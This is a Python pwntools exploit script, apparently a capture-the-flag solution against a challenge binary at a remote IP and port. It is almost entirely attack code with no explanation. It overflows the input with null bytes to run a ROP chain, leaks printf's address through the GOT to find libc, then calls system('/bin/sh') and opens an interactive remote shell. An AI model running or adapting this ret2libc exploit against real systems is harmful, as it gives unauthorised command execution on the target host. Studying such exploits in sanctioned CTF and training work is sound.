#!/usr/bin/python
from pwn import *

CONN = "nc 34.101.174.85 10008".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rn(n: int): return io.recvn(n)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
c
""".format(
    **locals()
)

# Binary filename
exe = "./chall"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

# Change logging level to help with debugging (error/warning/info/debug)
# context.terminal = "tmux splitw -h".split(" ")ls
context.log_level = "debug"

# Lib-C library, can use pwninit/patchelf to patch binary
libc = elf.libc
# ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

if args.REMOTE:
    libc = ELF("./libc6_2.7-10ubuntu5_amd64.so", checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Build the payload
ret = rop.ret
rop.raw(ret)
rop.call("printf", [elf.got["printf"]])
rop.raw(ret)
rop.call("main")

payload = b"\x00" * 9 + rop.chain()

sla(b"> ", payload)

leak = int((un64(io.recv(6))))
info("leak printf: " + hex(leak))
libc.address = leak - libc.sym["printf"]
info("Libc addr: " + hex(libc.address))

binsh = libc.search(b"/bin/sh\x00").__next__()

rop = ROP(libc)
rop.raw(ret)
rop.call("system", [binsh])

payload = b"\x00" * 9 + rop.chain()
sla(b"> ", payload)


# print(un64())
io.interactive()